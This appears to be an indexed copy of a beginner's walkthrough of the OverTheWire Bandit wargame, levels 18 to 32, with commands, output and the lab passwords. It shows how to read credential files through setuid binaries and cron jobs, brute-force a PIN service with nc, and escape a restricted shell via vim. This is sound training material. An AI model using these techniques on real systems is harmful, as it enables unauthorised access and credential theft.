vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL","date":"06-07-2019","objectID":"/bandit/:18:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 18 So now the password for the next level is the only line different between passwords.old and passwords.new. Let’s check the diff command. NAME diff - compare files line by line This should do it. bandit17@bandit:~$ diff passwords.old passwords.new 42c42 \u003c hlbSBPAWJmL6WFDb06gpTx1pPButblOA --- \u003e kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd So our password should be the one on the bottom since that’s the new one. Next one. ","date":"06-07-2019","objectID":"/bandit/:19:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 19 Now the problem is that once we login we are automatically kicked out myuser@myuser:~$ ssh bandit18@bandit.labs.overthewire.org -p 2220 (...connection established info...) Byebye ! Connection to bandit.labs.overthewire.org closed. myuser@myuser:~$ Hm… Ok, so what about if we try to run a command through ssh. Instead of opening a connection and get a prompt, just run a command. Well let’s check the man ssh command SYNOPSIS ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address] [-c cipher_spec] [-D [bind_address:]port] [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file] [-J destination] [-L address] [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address] [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]] destination [command] Well as we can see the last argument of the command is a command so let’s try it myuser@myuser:~$ ssh bandit18@bandit.labs.overthewire.org -p 2220 'cat readme' This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x myuser@myuser:~$ So we got kicked out but we were still able to run the command which gave us the password. NICE! Next one. ","date":"06-07-2019","objectID":"/bandit/:20:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 20 Let’s check the challenge description: To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), asetuidfter you have used the setuid binary. Let’s execute it without arguments then. bandit19@bandit:~$ ./bandit20-do Run a command as another user. Example: ./bandit20-do id We can see which user we are currently running the command by running whoami bandit19@bandit:~$ whoami bandit19 bandit19@bandit:~$ ./bandit20-do whoami bandit20 So this runs a command as bandit20. It should immediately pop to your mind the idea of just using cat to print the password as the next user. bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20 GbKksEFF4yrVs6il55v6gwY5aVje5f0j So we ran cat as bandit20 and gave it the file we wanted to print as an argument. This should be easy by now. ","date":"06-07-2019","objectID":"/bandit/:21:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 21 This challenge is really well detailed in the description so i’ll just paste it here There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21). So we need to run a server on a port that sends the password everytime someone connects to it. So we will need 2 terminals running because the server will hold on to one of them. We can use screen. We just need to execute screen which will get us into another empty terminal. To detach the current screen just hit Ctrl+a d. Then to resume just execute screen -r (RTFM on this one). We will also put a job into background by hitting Ctrl+z and then running fg to bring it to the foreground. bandit20@bandit:~$ screen (...enters a new screen session...) bandit20@bandit:~$ nc -l -p 30005 (...listening...) Now we detach the screen session and run ./suconnection 30005. bandit20@bandit:~$ ./suconnect 30005 (...waiting...) Let’s go back to our netcat server and send the old password. Hit Ctrl+z to send suconnect to the background and then run screen -r to resume the screen session. bandit20@bandit:~$ nc -l -p 30005 GbKksEFF4yrVs6il55v6gwY5aVje5f0j (...waiting...) Ok now finally let’s resume our suconnect by exiting screen and running fg. bandit20@bandit:~$ fg ./suconnect 30005 Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j Password matches, sending next password bandit20@bandit:~$ It worked!! Now we just need to go back to the netcat server to get the password received. bandit20@bandit:~$ screen -r (...switched to screen session...) bandit20@bandit:~$ nc -l -p 30005 GbKksEFF4yrVs6il55v6gwY5aVje5f0j gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr bandit20@bandit:~$ There we go. DONE! This was interesting! Next one. ","date":"06-07-2019","objectID":"/bandit/:22:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 22 A program is running periodically using cron. Let’s look into /etc/cron.d/. bandit21@bandit:~$ ls -la /etc/cron.d total 24 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 88 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 120 Oct 16 2018 cronjob_bandit22 -rw-r--r-- 1 root root 122 Oct 16 2018 cronjob_bandit23 -rw-r--r-- 1 root root 120 Oct 16 2018 cronjob_bandit24 -rw-r--r-- 1 root root 102 Oct 7 2017 .placeholder The one that interests us for now is cronjob_bandit22. cat it. bandit21@bandit:~$ cd /etc/cron.d bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22.sh \u0026\u003e /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh \u0026\u003e /dev/null So we may not understand this fully, but let’s check that file’s content. bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 \u003e /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv Ok this we can understand. So it’s printing out the password for the next level to that file. Let’s see if we can cat that file. bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI We got it! Next level. ","date":"06-07-2019","objectID":"/bandit/:23:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 23 This one is pretty much like the previous one but it’s a different cron job running. bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23 @reboot bandit23 /usr/bin/cronjob_bandit23.sh \u0026\u003e /dev/null * * * * * bandit23 /usr/bin/cronjob_bandit23.sh \u0026\u003e /dev/null So the cronjob is being ran as if it was by user bandit23. Let’s analyze the file mentioned in here. bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh #!/bin/bash myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1) echo \"Copying passwordfile /etc/bandit_pass/$mynameto /tmp/$mytarget\" cat /etc/bandit_pass/$myname \u003e /tmp/$mytarget So it prints the password to a directory whose name is generated by the command after mytarget. If we execute the command it should give us the name. We just have to replace $myname with bandit22, since that would be the output of running whoami as we’ve mentioned previously. bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1 8ca319486bfbbc3663ea0fbe81326349 Now if we cat this file we should get the password. bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n Done. Onto the next one. ","date":"06-07-2019","objectID":"/bandit/:24:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 24 Let’s see this challenge description since they have a few importante notes: A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level! NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around… So let’s first go to /etc/crond.d/ and check this level’s file. bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24 @reboot bandit24 /usr/bin/cronjob_bandit24.sh \u0026\u003e /dev/null * * * * * bandit24 /usr/bin/cronjob_bandit24.sh \u0026\u003e /dev/null cat the file mentioned in here bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh #!/bin/bash myname=$(whoami) cd /var/spool/$myname echo \"Executing and deleting all scripts in /var/spool/$myname:\" for i in * .*; do if [ \"$i\" != \".\" -a \"$i\" != \"..\" ]; then echo \"Handling $i\" timeout -s 9 60 ./$i rm -f ./$i fi done Once again this cron job is being ran as another user in this case bandit24. So myname will contain bandit24, leading us to the /var/spool/bandit24 directory. The message printed by echo tells us that it will execute and delete all scripts in here, so our idea would be to create a script that will cat the password file into another file that we create. This very simple to write in a bash script, let’s do it #!/bin/bash mkdir /tmp/dirforcron cat /etc/bandit_pass/bandit24 \u003e /tmp/dirforcron/pass chmod 777 /tmp/dirforcron/pass We will create this file in /tmp/dirfortest/ and name it script.sh. So what this do is creating a new directory to work in, cat the password file into a file in that directory and then changing the permissions to make it accessible to everyone. Now when we put this file in /var/spool/bandit24 we have to be sure that the user who will run it has enough permissions to do so. We can do this by doing bandit23@bandit:/var/spool/bandit24$ chmod 777 /tmp/dirfortest/script.sh Now that we gave it all the permissions possible we just need to copy it to /var/spool/bandit24 and wait for it to be ran. bandit23@bandit:/var/spool/bandit24$ cat /tmp/dirforcron/pass cat: /tmp/dirforcron/pass: No such file or directory bandit23@bandit:/var/spool/bandit24$ cat /tmp/dirforcron/pass UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ Success!!! Let’s go onto the next one. ","date":"06-07-2019","objectID":"/bandit/:25:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 25 A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. First let’s try to connect and see what it prints. We will use netcat to connect as before. bandit24@bandit:~$ nc localhost 30002 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. (...jibberish...) Wrong! Please enter the correct current password. Try again. ^C So it expects the password and the pin code in a line separated by a space. You can use your preferred scripting language to try and bruteforce this. I’ll use bash since it doesn’t depend on anything being preinstalled in the system (besides bash of course). #!/bin/bash rm input1.txt rm input2.txt rm output.txt touch output.txt touch input.txt for i in {0000..5000} do echo \"UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i\" \u003e\u003e input1.txt done for i in {5001..9999} do echo \"UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i\" \u003e\u003e input2.txt done echo \"input created will start nc connection\" cat input1.txt | nc localhost 30002 \u003e\u003e output.txt cat input2.txt | nc localhost 30002 \u003e\u003e output.txt cat output.txt | grep -v Wrong So what this does is it creates 2 input files with all the combinations. I do this because when i tried to do it all in once the connection tended to timeout. After creating the input i pipe it to a nc connection and write the result to a file. Finally, i pipe the content of the file to grep (the -v flag is to do invert macthing, so the lines that don’t contain “Wrong”) and the correct answer should be there. bandit24@bandit:/tmp/testbash$ bash script.sh rm: cannot remove 'input1.txt': No such file or directory rm: cannot remove 'input2.txt': No such file or directory input created will start nc connection I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Timeout. Exiting. I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Correct! The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG Exiting. Next one. ","date":"06-07-2019","objectID":"/bandit/:26:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 26 So the challenge now says, Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it. Let’s inspect our current directory bandit25@bandit:~$ ls -la total 32 drwxr-xr-x 2 root root 4096 May 26 18:23 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r----- 1 bandit25 bandit25 33 May 26 18:23 .bandit24.password -r-------- 1 bandit25 bandit25 1679 Oct 16 2018 bandit26.sshkey -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r----- 1 bandit25 bandit25 4 May 26 18:23 .pin -rw-r--r-- 1 root root 675 May 15 2017 .profile So we have a ssh key which i assume will be enough to log us in. Let’s try it. I downloaded the key to my personal machine, set the right permissions and then tried to login. myuser@myuser:~$ ssh bandit26@bandit.labs.overthewire.org -p 2220 -i ~/Desktop/bandit26.sshkey (...connection established...) Connection to bandit.labs.overthewire.org closed. myuser@myuser:~$ Hmmm… So it closed the connection immediately. Let’s try to run a command through ssh instead of establishing the connection (like in level 19), more specifically, try to understand what shell user bandit26 is running. We can do this by checking the content of the $SHELL variable. myuser@myuser:~$ ssh bandit26@bandit.labs.overthewire.org -p 2220 -i ~/Desktop/bandit26.sshkey 'echo $SHELL' This is a OverTheWire game server. More information on http://www.overthewire.org/wargames (...hangs...) ^C myuser@myuser:~$ Well that didn’t work. The connection just hanged. Let’s go back to bandit25 and check the content of the /etc/passwd file, since this stores information of the system users. bandit25@bandit:~$ cat /etc/passwd (...other users...) bandit25❌11025:11025:bandit level 25:/home/bandit25:/bin/bash bandit26❌11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext bandit27❌11027:11027:bandit level 27:/home/bandit27:/bin/bash (...other users...) OK we got something. So bandit26 is running /usr/bin/showtext as its default shell. Let’s investigate that file. bandit25@bandit:~$ cat /usr/bin/showtext #!/bin/sh export TERM=linux more ~/text.txt exit 0 So what this does is pretty much use more on file. more works like less which in sum are commands that help you viewing a file’s content that doesn’t fit on screen. So let’s do that, make the terminal as tiny as we can. --More--(16%) Ok so we got more running. Now i have no idea what to do. Let’s check the man more page. So from there we can see that there is an option that opens vim at the current line (vim is a terminal text editor). | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ ~ ~ Now we have it opened in vim as user bandit26. From vim we can get a shell via the :shell command. To do that just hit Esc and then type :shell _ _ _ _ ___ __ | | | (_) | |__ \\ / / :shell Now hit enter. _ _ _ _ ___ __ | | | (_) | |__ \\ / / --More--(33%) Wait… What? So that got us back to more… Oh right the shell was set to run more so we just need to change the :shell command in vim. We can do this by typing in command mode :set shell=/bin/bash. |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ ~ :set shell=/bin/bash And now run the :shell command. bandit26@bandit:~$ WE GOT A SHELL!!! Next challenge then. ","date":"06-07-2019","objectID":"/bandit/:27:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 27 We will be using the shell established from the previous level. Let’s check the current directory. bandit26@bandit:~$ ls -la total 36 drwxr-xr-x 3 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rwsr-x--- 1 bandit27 bandit26 7296 Oct 16 2018 bandit27-do -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile drwxr-xr-x 2 root root 4096 Oct 16 2018 .ssh -rw-r----- 1 bandit26 bandit26 258 Oct 16 2018 text.txt This brings us back to level 20 where we had a setuid binary. This is easy then, let’s just cat the password file. bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27 3ba3118a22e93127a4ed485be72ef5ea Good job! Next. ","date":"06-07-2019","objectID":"/bandit/:28:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 28 In this challenge we will have to work with git if you know nothing about it you should google it and read a few cheatsheets. There is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo. The password for the user bandit27-git is the same as for the user bandit27. Clone the repository and find the password for the next level. So i’ll first create a directory to clone the repository to, and then clone it. bandit27@bandit:~$ mkdir /tmp/gitfolder bandit27@bandit:~$ cd /tmp/gitfolder bandit27@bandit:/tmp/gitfolder$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo Cloning into 'repo'... Could not create directory '/home/bandit27/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit27-git@localhost's password: remote: Counting objects: 3, done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0) Receiving objects: 100% (3/3), done. bandit27@bandit:~$ Done. Let’s inspect the repo we’ve just cloned. bandit27@bandit:/tmp/gitfolder$ ls -la total 1952 drwxr-sr-x 3 bandit27 root 4096 Jul 6 13:46 . drwxrws-wt 57125 root root 1986560 Jul 6 13:47 .. drwxr-sr-x 3 bandit27 root 4096 Jul 6 13:47 repo bandit27@bandit:/tmp/gitfolder$ cd repo/ bandit27@bandit:/tmp/gitfolder/repo$ ls -la total 16 drwxr-sr-x 3 bandit27 root 4096 Jul 6 13:47 . drwxr-sr-x 3 bandit27 root 4096 Jul 6 13:46 .. drwxr-sr-x 8 bandit27 root 4096 Jul 6 13:47 .git -rw-r--r-- 1 bandit27 root 68 Jul 6 13:47 README Let’s check that README file. bandit27@bandit:/tmp/gitfolder/repo$ cat README The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2 Done. ","date":"06-07-2019","objectID":"/bandit/:29:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 29 Once again in this challenge we will have to work with git, There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28. Clone the repository and find the password for the next level. So let’s clone it again and see the repo content. bandit28@bandit:~$ mkdir /tmp/gitfolder2 bandit28@bandit:~$ cd /tmp/gitfolder2 bandit28@bandit:/tmp/gitfolder2$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo Cloning into 'repo'... Could not create directory '/home/bandit28/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit28-git@localhost's password: remote: Counting objects: 9, done. remote: Compressing objects: 100% (6/6), done. remote: Total 9 (delta 2), reused 0 (delta 0) Receiving objects: 100% (9/9), done. Resolving deltas: 100% (2/2), done. Inspect the repo. bandit28@bandit:/tmp/gitfolder2$ cd repo/ bandit28@bandit:/tmp/gitfolder2/repo$ ls -la total 16 drwxr-sr-x 3 bandit28 root 4096 Jul 6 13:51 . drwxr-sr-x 3 bandit28 root 4096 Jul 6 13:51 .. drwxr-sr-x 8 bandit28 root 4096 Jul 6 13:51 .git -rw-r--r-- 1 bandit28 root 111 Jul 6 13:51 README.md bandit28@bandit:/tmp/gitfolder2/repo$ cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: xxxxxxxxxx I saw a README.md file so i used cat to see it’s content and there was nothing there. Let’s inspect the commits made by doing git log. bandit28@bandit:/tmp/gitfolder2/repo$ git log commit 073c27c130e6ee407e12faad1dd3848a110c4f95 Author: Morla Porla \u003cmorla@overthewire.org\u003e Date: Tue Oct 16 14:00:39 2018 +0200 fix info leak commit 186a1038cc54d1358d42d468cdc8e3cc28a93fcb Author: Morla Porla \u003cmorla@overthewire.org\u003e Date: Tue Oct 16 14:00:39 2018 +0200 add missing data commit b67405defc6ef44210c53345fc953e6a21338cc7 Author: Ben Dover \u003cnoone@overthewire.org\u003e Date: Tue Oct 16 14:00:39 2018 +0200 initial commit of README.md Hmm… So the password used to be there but unfortunately someone was smart enough to remove it. We can go back to that commit by doing git checkout followed by the commit id. Let’s do it then. bandit28@bandit:/tmp/gitfolder2/repo$ git checkout 186a1038cc54d1358d42d468cdc8e3cc28a93fcb Note: checking out '186a1038cc54d1358d42d468cdc8e3cc28a93fcb'. You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by performing another checkout. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -b with the checkout command again. Example: git checkout -b \u003cnew-branch-name\u003e HEAD is now at 186a103... add missing data Let’s see what was the state of the repo in this commit. bandit28@bandit:/tmp/gitfolder2/repo$ ls -la total 16 drwxr-sr-x 3 bandit28 root 4096 Jul 6 13:55 . drwxr-sr-x 3 bandit28 root 4096 Jul 6 13:51 .. drwxr-sr-x 8 bandit28 root 4096 Jul 6 13:55 .git -rw-r--r-- 1 bandit28 root 133 Jul 6 13:55 README.md Still has the README.md file. By reading the commit messages we thought that there should be an information leak in this commit. Let’s print the file’s content. bandit28@bandit:/tmp/gitfolder2/repo$ cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: bbc96594b4e001778eee9975372716b2 We got the password. Good job! Onto the next one. ","date":"06-07-2019","objectID":"/bandit/:30:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 30 Same thing as before. We have a repo we need to clone it to a folder. bandit29@bandit:~$ mkdir /tmp/gitfolder3 bandit29@bandit:~$ cd /tmp/gitfolder3 bandit29@bandit:/tmp/gitfolder3$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo Cloning into 'repo'... Could not create directory '/home/bandit29/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit29/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit29-git@localhost's password: remote: Counting objects: 16, done. remote: Compressing objects: 100% (11/11), done. remote: Total 16 (delta 2), reused 0 (delta 0) Receiving objects: 100% (16/16), done. Resolving deltas: 100% (2/2), done. bandit29@bandit:/tmp/gitfolder3$ ls -la total 1952 drwxr-sr-x 3 bandit29 root 4096 Jul 6 14:02 . drwxrws-wt 57133 root root 1986560 Jul 6 14:02 .. drwxr-sr-x 3 bandit29 root 4096 Jul 6 14:02 repo bandit29@bandit:/tmp/gitfolder3$ cd repo/ bandit29@bandit:/tmp/gitfolder3/repo$ ls -al total 16 drwxr-sr-x 3 bandit29 root 4096 Jul 6 14:02 . drwxr-sr-x 3 bandit29 root 4096 Jul 6 14:02 .. drwxr-sr-x 8 bandit29 root 4096 Jul 6 14:02 .git -rw-r--r-- 1 bandit29 root 131 Jul 6 14:02 README.md Once again let’s see README.md's content. bandit29@bandit:/tmp/gitfolder3/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: \u003cno passwords in production!\u003e We’ve been through this before. Let’s check the previous commits. bandit29@bandit:/tmp/gitfolder3/repo$ git log commit 84abedc104bbc0c65cb9eb74eb1d3057753e70f8 Author: Ben Dover \u003cnoone@overthewire.org\u003e Date: Tue Oct 16 14:00:41 2018 +0200 fix username commit 9b19e7d8c1aadf4edcc5b15ba8107329ad6c5650 Author: Ben Dover \u003cnoone@overthewire.org\u003e Date: Tue Oct 16 14:00:41 2018 +0200 initial commit of README.md We can check if that first commit has anything interesting. bandit29@bandit:/tmp/gitfolder3/repo$ git checkout 9b19e7d8c1aadf4edcc5b15ba8107329ad6c5650 Note: checking out '9b19e7d8c1aadf4edcc5b15ba8107329ad6c5650'. You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by performing another checkout. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -b with the checkout command again. Example: git checkout -b \u003cnew-branch-name\u003e HEAD is now at 9b19e7d... initial commit of README.md Now let’s check the file’s content again. bandit29@bandit:/tmp/gitfolder3/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit29 - password: \u003cno passwords in production!\u003e Hm… Still nothing. Let’s go back to our most recent commit by doing git pull and the repo link. bandit29@bandit:/tmp/gitfolder3/repo$ git pull ssh://bandit29-git@localhost/home/bandit29-git/repo Could not create directory '/home/bandit29/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit29/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit29-git@localhost's password: From ssh://localhost/home/bandit29-git/repo * branch HEAD -\u003e FETCH_HEAD Updating 9b19e7d..84abedc Fast-forward README.md | 2 +- 1 file changed, 1 insertion(+), 1 deletion(-) We can see what branches exist by doing git branch. bandit29@bandit:/tmp/gitfolder3/repo$ git branch * (HEAD detached from 9b19e7d) master We have 2 branches. Let’s switch to the master branch since our chec","date":"06-07-2019","objectID":"/bandit/:31:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 31 This challenge is still related to git. So we’ll just follow the same steps as before, create the directory and clone the repo in there. bandit30@bandit:~$ mkdir /tmp/gitfolder4 bandit30@bandit:~$ cd /tmp/gitfolder4 bandit30@bandit:/tmp/gitfolder4$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo Cloning into 'repo'... Could not create directory '/home/bandit30/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit30/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit30-git@localhost's password: remote: Counting objects: 4, done. remote: Total 4 (delta 0), reused 0 (delta 0) Receiving objects: 100% (4/4), done. bandit30@bandit:/tmp/gitfolder4$ ls -la total 1952 drwxr-sr-x 3 bandit30 root 4096 Jul 6 19:12 . drwxrws-wt 57253 root root 1986560 Jul 6 19:14 .. drwxr-sr-x 3 bandit30 root 4096 Jul 6 19:12 repo bandit30@bandit:/tmp/gitfolder4$ cd repo bandit30@bandit:/tmp/gitfolder4/repo$ ls -la total 16 drwxr-sr-x 3 bandit30 root 4096 Jul 6 19:12 . drwxr-sr-x 3 bandit30 root 4096 Jul 6 19:12 .. drwxr-sr-x 8 bandit30 root 4096 Jul 6 19:12 .git -rw-r--r-- 1 bandit30 root 30 Jul 6 19:12 README.md bandit30@bandit:/tmp/gitfolder4/repo$ cat README.md just an epmty file... muahaha This was me inspecting the files and folders in the repo. There is nothing interesting, so let’s check git. bandit30@bandit:/tmp/gitfolder4/repo$ git show-branch --all * [master] initial commit of README.md ! [origin/HEAD] initial commit of README.md ! [origin/master] initial commit of README.md --- *++ [master] initial commit of README.md No special hidden branches. bandit30@bandit:/tmp/gitfolder4/repo$ git log commit 3aa4c239f729b07deb99a52f125893e162daac9e Author: Ben Dover \u003cnoone@overthewire.org\u003e Date: Tue Oct 16 14:00:44 2018 +0200 initial commit of README.md Only one commit, nothing interesting… Let’s check the tags then. bandit30@bandit:/tmp/gitfolder4/repo/.git$ git tag secret OK this seems interesting! A tag called secret. We can see the tag message by doing git show secret. bandit30@bandit:/tmp/gitfolder4/repo$ git show secret 47e603bb428404d265f59c42920d81e5 We got the password. Next one! ","date":"06-07-2019","objectID":"/bandit/:32:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 32 Once gain this challenge uses git. bandit31@bandit:~$ ls -la total 24 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rwxr-xr-x 1 root root 59 Oct 16 2018 .gitconfig -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit31@bandit:~$ mkdir /tmp/gitfolder5 bandit31@bandit:~$ cd /tmp/gitfolder5 bandit31@bandit:/tmp/gitfolder5$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo Cloning into 'repo'... Could not create directory '/home/bandit31/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit31-git@localhost's password: remote: Counting objects: 4, done. remote: Compressing objects: 100% (3/3), done. remote: Total 4 (delta 0), reused 0 (delta 0) Receiving objects: 100% (4/4), done. Let’s inspect the repo. bandit31@bandit:/tmp/gitfolder5$ ls -la total 1952 drwxr-sr-x 3 bandit31 root 4096 Jul 6 19:37 . drwxrws-wt 57264 root root 1986560 Jul 6 19:38 .. drwxr-sr-x 3 bandit31 root 4096 Jul 6 19:37 repo 